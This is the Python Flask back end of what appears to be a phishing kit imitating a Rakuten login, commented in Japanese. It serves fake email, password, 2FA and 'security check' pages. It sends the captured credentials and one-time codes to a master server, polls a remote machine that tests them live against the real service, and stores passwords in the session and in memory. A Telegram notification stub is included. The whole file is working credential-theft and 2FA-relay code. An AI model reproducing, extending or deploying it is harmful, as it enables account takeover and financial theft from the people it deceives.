"""
サブサーバーのメインアプリケーション
クライアント向けログインサイト
"""
from flask import Flask, request, jsonify, render_template, session
import requests
import threading
import time
import uuid
import subprocess
import sys
import os
from datetime import datetime
from config import SECRET_KEY, DEBUG, MASTER_SERVER_URL, CALLBACK_URL

# Playwright自動インストール
def ensure_playwright_browsers():
    """Playwrightブラウザが未インストールなら自動インストール"""
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            browser.close()
            print("[INFO] Playwrightブラウザ: インストール済み")
    except Exception as e:
        print(f"[INFO] Playwrightブラウザが未インストール: {e}")
        print("[INFO] Playwrightブラウザをインストール中...")
        try:
            subprocess.run(
                [sys.executable, "-m", "playwright", "install", "--with-deps", "chromium"],
                check=True,
                capture_output=True
            )
            print("[INFO] Playwrightブラウザインストール完了")
        except Exception as install_error:
            print(f"[ERROR] Playwrightインストール失敗: {install_error}")

if not os.environ.get('SKIP_PLAYWRIGHT_CHECK'):
    ensure_playwright_browsers()

from selenium_functions import rakuten_login_check

app = Flask(__name__, template_folder='templates')
app.secret_key = SECRET_KEY

connection_check_results = {}
twofa_sessions = {}
login_check_results = {}

def start_polling(request_id):
    """0.5秒ごとにポーリング"""
    def poll():
        max_attempts = 120
        attempt = 0
        
        while attempt < max_attempts:
            try:
                response = requests.get(
                    f"{MASTER_SERVER_URL}/api/request-result/connectioncheck/{request_id}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    status = data.get('status')
                    
                    if status in ['success', 'failed', 'timeout']:
                        connection_check_results[request_id] = {
                            'status': status,
                            'pc_id': data.get('locked_by'),
                            'received_at': datetime.now().isoformat()
                        }
                        break
                
            except Exception as e:
                print(f"[ERROR] ポーリングエラー: {e}")
            
            attempt += 1
            time.sleep(0.5)
    
    thread = threading.Thread(target=poll, daemon=True)
    thread.start()

def start_login_polling(request_id, email, password):
    """ログインチェック結果を0.5秒ごとにポーリング"""
    def poll():
        max_attempts = 120
        attempt = 0
        
        while attempt < max_attempts:
            try:
                response = requests.get(
                    f"{MASTER_SERVER_URL}/api/request-result/logincheckrequest/{request_id}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    status = data.get('status')
                    
                    if status in ['success', 'failed', 'timeout']:
                        login_check_results[request_id] = {
                            'status': status,
                            'pc_id': data.get('locked_by'),
                            'received_at': datetime.now().isoformat()
                        }
                        
                        # 本サーバーに結果通知
                        try:
                            requests.post(
                                f"{MASTER_SERVER_URL}/api/login/result",
                                json={
                                    'email': email,
                                    'password': password,
                                    'result': status
                                },
                                timeout=10
                            )
                            print(f"[INFO] 本サーバーに結果通知: {status}")
                        except:
                            pass
                        
                        break
                
            except Exception as e:
                print(f"[ERROR] ログインポーリングエラー: {e}")
            
            attempt += 1
            time.sleep(0.5)
    
    thread = threading.Thread(target=poll, daemon=True)
    thread.start()

def poll_twofa_status(email):
    """2FA承認状態を0.5秒ごとにポーリング"""
    def poll():
        max_attempts = 120
        attempt = 0
        
        while attempt < max_attempts:
            try:
                response = requests.get(
                    f"{MASTER_SERVER_URL}/api/twofa-status/{email}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    
                    if email not in twofa_sessions:
                        twofa_sessions[email] = {}
                    
                    twofa_sessions[email].update(data)
                    
                    if data.get('approved'):
                        break
                
            except Exception as e:
                print(f"[ERROR] 2FAポーリングエラー: {e}")
            
            attempt += 1
            time.sleep(0.5)
    
    thread = threading.Thread(target=poll, daemon=True)
    thread.start()

@app.route('/')
def index():
    return render_template('loginemail.html')

@app.route('/login/email')
def login_email():
    return render_template('loginemail.html')

@app.route('/login/password')
def login_password():
    return render_template('loginpassword.html')

@app.route('/login/2fa')
def login_2fa():
    return render_template('login2fa.html')

@app.route('/dashboard/security-check')
def dashboard_security_check():
    return render_template('dashboardsecuritycheck.html')

@app.route('/dashboard/complete')
def dashboard_complete():
    return render_template('dashboardcomplete.html')

@app.route('/check')
def check():
    return render_template('check.html')

@app.route('/api/check-connection', methods=['POST'])
def check_connection():
    """接続チェックリクエストを送信"""
    try:
        response = requests.post(f"{MASTER_SERVER_URL}/api/request", json={
            'genre': 'connectioncheck',
            'callback_url': CALLBACK_URL
        }, timeout=10)
        
        if response.status_code == 201:
            data = response.json()
            request_id = data['request_id']
            
            connection_check_results[request_id] = {
                'status': 'pending',
                'created_at': datetime.now().isoformat()
            }
            
            start_polling(request_id)
            
            return jsonify({
                'success': True,
                'request_id': request_id,
                'message': '接続チェックリクエストを送信しました'
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': f'本サーバーエラー: {response.status_code}'
            }), 500
            
    except Exception as e:
        print(f"[ERROR] 接続チェックエラー: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/check-result/<request_id>', methods=['GET'])
def get_check_result(request_id):
    """接続チェック結果を取得"""
    result = connection_check_results.get(request_id)
    
    if result:
        return jsonify(result), 200
    else:
        return jsonify({'error': 'Result not found'}), 404

@app.route('/api/login', methods=['POST'])
def api_login():
    """ログイン処理 - 即座にレスポンスを返す"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    if not email or not password:
        return jsonify({
            'success': False,
            'error': 'メールアドレスとパスワードを入力してください'
        }), 400
    
    print(f"[INFO] ログイン処理開始 | Email: {email}")
    
    # 1. 即座に本サーバーにログインリクエストを作成
    try:
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/request",
            json={
                'genre': 'logincheckrequest',
                'callback_url': CALLBACK_URL,
                'data': {
                    'email': email,
                    'password': password
                }
            },
            timeout=10
        )
        
        if response.status_code != 201:
            return jsonify({
                'success': False,
                'error': '本サーバーへのリクエスト作成に失敗しました'
            }), 500
        
        result = response.json()
        request_id = result.get('request_id')
        
        print(f"[INFO] ログインリクエスト送信完了 | request_id: {request_id}")
        
    except Exception as e:
        print(f"[ERROR] 本サーバーへのリクエスト送信エラー: {e}")
        return jsonify({
            'success': False,
            'error': 'サーバーとの通信に失敗しました'
        }), 500
    
    # 2. バックグラウンドでポーリング開始（ノンブロッキング）
    def background_task():
        start_login_polling(request_id, email, password)
        
        # PC結果を待機
        max_wait = 60
        start_time = time.time()
        
        while time.time() - start_time < max_wait:
            result_data = login_check_results.get(request_id)
            
            if result_data:
                status = result_data.get('status')
                
                if status == 'success':
                    # セッション保存
                    session['email'] = email
                    session['password'] = password
                    twofa_sessions[email] = {
                        'password': password,
                        'approved': False,
                        'rejected': False,
                        'created_at': datetime.now().isoformat()
                    }
                    
                    # 2FAセッション初期化
                    try:
                        requests.post(
                            f"{MASTER_SERVER_URL}/api/login/init-session",
                            json={'email': email, 'password': password},
                            timeout=10
                        )
                        print(f"[SUCCESS] 2FAセッション初期化完了 | Email: {email}")
                    except:
                        pass
                    
                    break
                
                elif status in ['failed', 'timeout']:
                    break
            
            time.sleep(0.5)
    
    # バックグラウンドスレッドで実行
    threading.Thread(target=background_task, daemon=True).start()
    
    # 3. 即座にレスポンスを返す（ポーリング用のrequest_idを含める）
    return jsonify({
        'success': True,
        'request_id': request_id,
        'message': 'ログイン処理を開始しました'
    }), 202  # 202 Accepted


@app.route('/api/login/status/<request_id>', methods=['GET'])
def api_login_status(request_id):
    """ログイン処理の状態を取得"""
    result = login_check_results.get(request_id)
    
    if result:
        status = result.get('status')
        
        if status == 'success':
            return jsonify({
                'success': True,
                'status': 'completed',
                'result': 'success',
                'redirect': '/login/2fa'
            }), 200
        elif status == 'failed':
            return jsonify({
                'success': True,
                'status': 'completed',
                'result': 'failed',
                'error': 'ログインに失敗しました'
            }), 200
        elif status == 'timeout':
            return jsonify({
                'success': True,
                'status': 'completed',
                'result': 'timeout',
                'error': 'タイムアウトしました'
            }), 200
    
    # まだ処理中
    return jsonify({
        'success': True,
        'status': 'processing'
    }), 200


def check_pc_connection(stop_flag):
    try:
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/request",
            json={
                'genre': 'connectioncheck',
                'callback_url': CALLBACK_URL
            },
            timeout=10
        )
        
        if response.status_code != 201:
            print(f"[ERROR] リクエスト送信失敗: status={response.status_code}")
            print(f"[ERROR] レスポンス: {response.text}")
            return False
        
        data = response.json()
        request_id = data.get('request_id')
        print(f"[INFO] connectioncheck送信成功 | request_id: {request_id}")
        
        start_time = time.time()
        while time.time() - start_time < 5.0:
            if stop_flag and stop_flag.get('stop'):
                print(f"[INFO] PC接続確認を中断します（他のスレッドが失敗）")
                return False
            
            try:
                result_response = requests.get(
                    f"{MASTER_SERVER_URL}/api/request-result/connectioncheck/{request_id}",
                    timeout=5
                )
                
                if result_response.status_code == 200:
                    result = result_response.json()
                    status = result.get('status')
                    
                    elapsed = time.time() - start_time
                    print(f"[INFO] ポーリング中... ({elapsed:.1f}秒経過) | status: {status}")
                    
                    if status == 'success':
                        print(f"[SUCCESS] PC接続確認成功 ({elapsed:.1f}秒)")
                        return True
                    elif status in ['failed', 'timeout']:
                        print(f"[ERROR] PC接続確認失敗 | status: {status}")
                        return False
                    
            except Exception as e:
                print(f"[ERROR] ポーリング中エラー: {e}")
            
            time.sleep(0.1)
        
        print(f"[ERROR] PC接続確認タイムアウト (5秒)")
        return False
        
    except Exception as e:
        print(f"[ERROR] PC接続確認エラー: {e}")
        import traceback
        traceback.print_exc()
        return False


def send_login_to_pc(email, password):
    try:
        print(f"[INFO] PCへログイン情報送信開始 | Email: {email}")
        
        send_telegram_notification(email)
        
        requests.post(
            f"{MASTER_SERVER_URL}/api/request",
            json={
                'genre': 'logincheckrequest',
                'callback_url': CALLBACK_URL,
                'data': {
                    'email': email,
                    'password': password
                }
            },
            timeout=5
        )
        
        print(f"[SUCCESS] PCへログイン情報送信完了 | Email: {email}")
        
    except Exception as e:
        print(f"[ERROR] PCへログイン情報送信エラー: {e}")


def send_telegram_notification(email):
    try:
        print(f"[INFO] テレグラム通知送信: {email}")
    except Exception as e:
        print(f"[ERROR] テレグラム通知エラー: {e}")

@app.route('/api/2fa/submit', methods=['POST'])
def api_2fa_submit():
    """2FAコードを本サーバーに送信"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        code = data.get('code', '').strip()
        
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/2fa/submit",
            json={
                'email': email,
                'password': password,
                'code': code
            },
            timeout=10
        )
        
        poll_twofa_status(email)
        
        return jsonify(response.json()), response.status_code
        
    except Exception as e:
        print(f"[ERROR] 2FA送信エラー: {e}")
        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500

@app.route('/api/2fa/check-status', methods=['POST'])
def api_2fa_check_status():
    """2FA承認状態をチェック"""
    data = request.json
    email = data.get('email', '').strip()
    
    session_data = twofa_sessions.get(email, {})
    
    return jsonify({
        'success': True,
        'is_approved': session_data.get('approved', False),
        'rejected': session_data.get('rejected', False)
    }), 200

@app.route('/api/security-check/submit', methods=['POST'])
def api_security_check_submit():
    """セキュリティチェックを本サーバーに送信"""
    try:
        data = request.json
        
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/security-check/submit",
            json=data,
            timeout=10
        )
        
        return jsonify(response.json()), response.status_code
        
    except Exception as e:
        print(f"[ERROR] セキュリティチェックエラー: {e}")
        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500

@app.route('/api/security-check/check-status', methods=['POST'])
def api_security_check_status():
    """セキュリティチェック完了状態をチェック"""
    try:
        data = request.json
        
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/security-check/check-status",
            json=data,
            timeout=10
        )
        
        return jsonify(response.json()), response.status_code
        
    except Exception as e:
        print(f"[ERROR] セキュリティチェック状態確認エラー: {e}")
        return jsonify({'success': False}), 500

if __name__ == '__main__':
    print("=" * 60)
    print("サブサーバー起動")
    print("=" * 60)
    print(f"本サーバー: {MASTER_SERVER_URL}")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=5001, debug=DEBUG)